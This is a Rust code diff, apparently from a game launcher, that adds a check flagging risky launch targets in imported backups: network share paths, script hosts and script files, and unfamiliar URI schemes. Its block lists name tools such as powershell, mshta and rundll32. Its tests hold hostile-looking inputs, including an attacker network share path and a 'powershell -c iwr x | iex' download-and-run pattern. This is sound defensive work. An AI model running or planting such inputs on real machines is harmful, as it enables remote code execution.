@@ -55,6 +55,80 @@ fn is_scheme(scheme: &str) -> bool {
         && chars.all(|c| c.is_ascii_alphanumeric() || matches!(c, '+' | '-' | '.'))
 }
 
+/// Why a launch target from someone else (an imported backup) deserves a second look.
+#[derive(Debug, Clone, Copy, PartialEq, Eq)]
+pub enum Risk {
+    /// `\\server\share\…`, as target or argument: runs a file from another computer.
+    NetworkPath,
+    /// A shell, a script host or a script file: whatever its arguments say runs.
+    Script,
+    /// A URI scheme other than the launchers' (`ms-msdt:`, `search-ms:`, `file:`…).
+    UnknownScheme,
+}
+
+/// Programs whose arguments are themselves a program, by lowercase file stem.
+const SCRIPT_HOSTS: [&str; 13] = [
+    "bash",
+    "cmd",
+    "conhost",
+    "cscript",
+    "forfiles",
+    "msiexec",
+    "mshta",
+    "powershell",
+    "powershell_ise",
+    "pwsh",
+    "regsvr32",
+    "rundll32",
+    "wscript",
+];
+
+/// Files the shell runs as scripts or installers rather than opening.
+const SCRIPT_EXTENSIONS: [&str; 11] = [
+    "bat", "cmd", "hta", "js", "jse", "msi", "ps1", "scr", "vbe", "vbs", "wsf",
+];
+
+/// URI schemes of the game launchers (`shell:` only for `shell:AppsFolder\…`).
+const SAFE_SCHEMES: [&str; 9] = [
+    "battlenet",
+    "com.epicgames.launcher",
+    "goggalaxy",
+    "http",
+    "https",
+    "origin",
+    "origin2",
+    "steam",
+    "uplay",
+];
+
+/// `None` for an ordinary program or launcher link. Only judges what the strings say: the
+/// user's own apps can be anything, this is for targets that come from elsewhere.
+pub fn risk(target: &str, args: Option<&str>) -> Option<Risk> {
+    let target = target.trim();
+    let network = |text: &str| text.starts_with(r"\\") || text.starts_with("//");
+    if network(target) || args.is_some_and(|a| a.contains(r"\\")) {
+        return Some(Risk::NetworkPath);
+    }
+    // `C:\…` is a drive, not a one-letter scheme.
+    if let Some((scheme, rest)) = target.split_once(':')
+        && scheme.len() > 1
+        && is_scheme(scheme)
+    {
+        let scheme = scheme.to_ascii_lowercase();
+        let apps_folder = scheme == "shell"
+            && rest
+                .get(..11)
+                .is_some_and(|s| s.eq_ignore_ascii_case(r"AppsFolder\"));
+        let safe = apps_folder || SAFE_SCHEMES.contains(&scheme.as_str());
+        return (!safe).then_some(Risk::UnknownScheme);
+    }
+    let path = Path::new(target);
+    let lower = |part: Option<&std::ffi::OsStr>| part.map(|p| p.to_string_lossy().to_lowercase());
+    let script = lower(path.file_stem()).is_some_and(|s| SCRIPT_HOSTS.contains(&s.as_str()))
+        || lower(path.extension()).is_some_and(|e| SCRIPT_EXTENSIONS.contains(&e.as_str()));
+    script.then_some(Risk::Script)
+}
+
 /// Process to track for a target: its file name when it is an exe, `None` for URIs
 /// (launchers spawn another process, to be set by hand).
 pub fn watch_exe_for(target: &str) -> Option<String> {
@@ -96,6 +170,46 @@ mod tests {
         assert!(!is_available(r"http\shell://x"));
         assert!(!is_available("://x"));
         assert!(!is_available("1http://x"));
+    }
+
+    #[test]
+    fn risky_targets_are_recognized() {
+        use Risk::{NetworkPath, Script, UnknownScheme};
+        for (target, args, expected) in [
+            // What the scans and the forms produce.
+            (r"C:\Games\Hades\Hades.exe", Some("-dx12"), None),
+            ("notepad.exe", None, None),
+            ("steam://rungameid/1145360", None, None),
+            ("com.epicgames.launcher://apps/x?action=launch", None, None),
+            ("uplay://launch/635/0", None, None),
+            (
+                r"shell:AppsFolder\Microsoft.WindowsNotepad_8wekyb3d8bbwe!App",
+                None,
+                None,
+            ),
+            ("https://example.com", None, None),
+            (r"D:\Jeux\cmd-tools\game.exe", None, None),
+            // From someone else's backup.
+            (r"\\attacker\share\Game.exe", None, Some(NetworkPath)),
+            ("//attacker/share/Game.exe", None, Some(NetworkPath)),
+            (
+                "explorer.exe",
+                Some(r"\\attacker\share\x.exe"),
+                Some(NetworkPath),
+            ),
+            ("powershell.exe", Some("-c iwr x | iex"), Some(Script)),
+            (r"C:\Windows\System32\CMD.EXE", Some("/c x"), Some(Script)),
+            ("rundll32", Some("x.dll,Run"), Some(Script)),
+            ("mshta.exe", None, Some(Script)),
+            (r"C:\Users\me\Downloads\setup.BAT", None, Some(Script)),
+            (r"C:\x\payload.vbs", None, Some(Script)),
+            ("ms-msdt:/id PCWDiagnostic", None, Some(UnknownScheme)),
+            ("search-ms:query=x", None, Some(UnknownScheme)),
+            ("file:///C:/x.exe", None, Some(UnknownScheme)),
+            (r"shell:startup", None, Some(UnknownScheme)),
+        ] {
+            assert_eq!(risk(target, args), expected, "{target} {args:?}");
+        }
     }
 
     #[test]
